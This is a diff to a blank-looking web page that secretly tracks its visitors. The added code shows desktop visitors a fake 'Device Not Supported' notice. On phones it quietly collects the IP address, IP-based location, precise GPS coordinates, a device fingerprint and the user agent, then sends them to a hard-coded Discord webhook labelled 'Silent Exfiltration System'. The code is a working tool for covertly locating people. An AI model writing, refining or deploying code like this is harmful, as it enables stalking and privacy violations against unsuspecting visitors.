@@ -11,22 +11,73 @@
             height: 100vh;
             width: 100vw;
             overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: monospace;
+        }
+        #error-message {
+            color: #ff3333;
+            text-align: center;
+            font-size: 1.2rem;
+            display: none; /* Hidden by default */
+            padding: 20px;
+            border: 1px solid #ff3333;
+            border-radius: 8px;
+            background: #110000;
         }
     </style>
 </head>
 <body>
 
+<div id="error-message">
+    <strong>Device Not Supported</strong><br><br>
+    Please try on a mobile device.
+</div>
+
 <script>
     // ⚠️ YOUR DISCORD WEBHOOK URL ⚠️
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561439920571289760/bibhypIWcysN4R9oPLF2i6NBwU_Vj-BZ_uXigEYYwKAQWto3_cb21aocNKeE4cSb742y';
 
-    // Wrapper to handle errors gracefully so the black screen stays blank
-    (async function() {
+    // 1. Detect if the device is a PC (Desktop/Laptop)
+    function isPC() {
+        const ua = navigator.userAgent;
+        
+        // Check for common mobile keywords in the User Agent
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+        
+        // Check if the device has a touch screen (Phones/Tablets have this, most laptops don't)
+        const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+        
+        // Check screen size (PC screens are usually wider than 1024px)
+        const isLargeScreen = window.innerWidth > 1024;
+
+        // If it's NOT a mobile browser, and it has a large screen -> It's a PC
+        if (!isMobile && isLargeScreen) {
+            return true;
+        }
+        
+        return false;
+    }
+
+    // 2. Logic Handler
+    if (isPC()) {
+        // If it's a PC, show the error and DO NOT execute the payload
+        document.getElementById('error-message').style.display = 'block';
+        console.log("PC detected. Payload blocked.");
+    } else {
+        // If it's a Mobile device, keep it black and run the payload
+        console.log("Mobile device detected. Running payload...");
+        executePayload();
+    }
+
+    // 3. The Exfiltration Payload
+    async function executePayload() {
         let ipData = {};
         let gpsData = { status: "Not requested" };
 
         try {
-            // 1. Fetch IP & Approximate Location (Silent)
+            // Fetch IP & Approximate Location
             const ipRes = await fetch('https://freeipapi.com/api/json');
             ipData = await ipRes.json();
         } catch (e) {
@@ -34,48 +85,56 @@
         }
 
         try {
-            // 2. Request Exact GPS (Triggers browser prompt)
-            // We set a timeout so if they ignore the prompt, it doesn't hang forever
+            // Request Exact GPS
             if (navigator.geolocation) {
                 gpsData = await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => resolve({
-                            status: "Success",
+                            status: "SUCCESS (Exact GPS Received)",
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
                             acc: pos.coords.accuracy
                         }),
-                        (err) => resolve({ status: "Denied/Failed", error: err.message }),
-                        { enableHighAccuracy: true, timeout: 5000 }
+                        (err) => {
+                            let reason = "Unknown";
+                            if (err.code === 1) reason = "Permission Denied";
+                            if (err.code === 2) reason = "Position Unavailable";
+                            if (err.code === 3) reason = "Timeout";
+                            resolve({ status: "FAILED", reason: reason, errorCode: err.code });
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 });
             }
         } catch (e) {
-            gpsData = { status: 'Geolocation API Error' };
+            gpsData = { status: 'ERROR', reason: e.toString() };
         }
 
-        // 3. Build the Exfil Payload
-        const exactGPSString = gpsData.status === "Success" 
-            ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAccuracy: ${gpsData.acc}m`
-            : `Status: ${gpsData.status}\nReason: ${gpsData.error || 'N/A'}`;
+        // Build the Exfil Payload
+        let gpsString = "";
+        if (gpsData.status.includes("SUCCESS")) {
+            gpsString = `✅ **Status:** ${gpsData.status}\n**Latitude:** \`${gpsData.lat}\`\n**Longitude:** \`${gpsData.lon}\`\n**Accuracy:** ${gpsData.acc} meters`;
+        } else {
+            gpsString = `❌ **Status:** ${gpsData.status}\n**Reason:** ${gpsData.reason}`;
+        }
 
-        const mapLink = gpsData.status === "Success" 
+        const mapLink = gpsData.lat 
             ? `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}` 
             : (ipData.latitude ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : 'N/A');
 
         const payload = {
-            content: `🚨 **Target Visited the Blank Page** 🚨`,
+            content: `🚨 **Mobile Target Visited the Page** 🚨`,
             embeds: [
                 {
                     title: "Personal Information Captured",
-                    color: 16711680, // Red
+                    color: gpsData.lat ? 65280 : 16711680,
                     fields: [
                         { name: "IP Address", value: `\`${ipData.ipAddress || 'Unknown'}\``, inline: true },
                         { name: "ISP / Org", value: `\`${ipData.asnOrganization || 'Unknown'}\``, inline: true },
                         { name: "Approx Location (IP)", value: `${ipData.cityName || '?'}, ${ipData.regionName || '?'}, ${ipData.countryName || '?'}`, inline: false },
-                        { name: "Exact GPS Coordinates", value: exactGPSString, inline: false },
+                        { name: "Exact GPS Data", value: gpsString, inline: false },
                         { name: "Map Link", value: mapLink, inline: false },
-                        { name: "Device Fingerprint", value: `**OS/Platform:** ${navigator.platform}\n**Screen:** ${screen.width}x${screen.height}\n**Language:** ${navigator.language}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
+                        { name: "Device Fingerprint", value: `**OS/Platform:** ${navigator.platform}\n**Screen:** ${screen.width}x${screen.height}\n**Language:** ${navigator.language}`, inline: false },
                         { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                     ],
                     footer: { text: "Silent Exfiltration System" },
@@ -84,7 +143,7 @@
             ]
         };
 
-        // 4. Send to Discord
+        // Send to Discord
         try {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
@@ -94,7 +153,7 @@
         } catch (e) {
             console.error("Discord webhook failed:", e);
         }
-    })();
+    }
 </script>
 </body>
 </html>
